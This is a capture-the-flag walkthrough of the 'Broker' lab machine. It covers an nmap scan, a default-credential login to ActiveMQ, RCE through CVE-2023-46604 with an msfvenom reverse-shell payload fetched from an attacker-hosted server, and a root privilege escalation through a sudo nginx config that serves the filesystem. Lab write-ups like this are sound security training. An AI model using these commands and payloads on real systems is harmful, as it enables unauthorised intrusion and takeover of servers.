# **Broker** 

***
## **Difficulty = Easy**

![Broker](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/39c3a12f-d830-4f4e-9dcc-c80d05348148)

***


Running an nmap scan we have -:


```bash
# Nmap 7.94 scan initiated Thu Nov  9 23:49:15 2023 as: nmap -p22,80,1883,5672,8161,8888,42445,61613,61614,61616 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.11.243
Nmap scan report for 10.10.11.243
Host is up (0.53s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
8888/tcp  open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
|_http-title: Index of /
42445/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at
```



Navigating to port `80/HTTP` we have a login page


![](https://i.imgur.com/Lu2FcPA.png)


Using default credentials `admin:admin` gives us access


![](https://i.imgur.com/kcfolyK.png)


Enumerating the **ActiveMQ** manager i found this [exploit](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ), you can go ahead and clone the whole respository


```shell
$ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
```


Then build the exploit since it is written in **Go**


```bash
$ go build
```



Create a `msfvenom` binary (`.elf`) for the reverse  shell 

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
```


![](https://i.imgur.com/9HjX2hf.png)


Now host you payload on a **python server**


```bash
$ python3 -m http.server 8001
```

Open up the `poc-linux.xml` with your favorite text editor and replace the URL with your attacker IP address


![](https://i.imgur.com/uJMiT17.png)



Now start up your listener with `netcat` on port `4444` and run the exploit


```bash
$ ./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.16.7:8001/poc-linux.xml
```


Hell yeah 😎, and we got reverse shell as user **activemq**


![](https://i.imgur.com/CtCfcJX.png)


Running `sudo -l` we have the permissions to run `/usr/sbin/nginx` as **root**



![](https://i.imgur.com/tqY4VFY.png)



We can go ahead and navigate to our `/tmp` directory then save this config into a file called `whatever.conf`, This will host the / directory on the nginx server listening on port `1337`, Since we are running nginx with sudo we might be able to read the `/root` directory


```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```


Now run `nginx` pointing to the config file

```bash
$ sudo /usr/sbin/nginx -c /tmp/whatever.conf 
```

Making a `curl` request to `127.0.0.1` on port `1337` we can see that we now have the root directory served, we can go ahead and grab our **root** flag

```bash
$ curl 127.0.0.1:1337/root/root.txt
```


![](https://i.imgur.com/e1IUIA9.png)


Bankai, Have fun 🤾‍♂️


![](https://i.pinimg.com/originals/ea/8b/13/ea8b137fbc46bea2f12cc9087e57053d.gif)



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

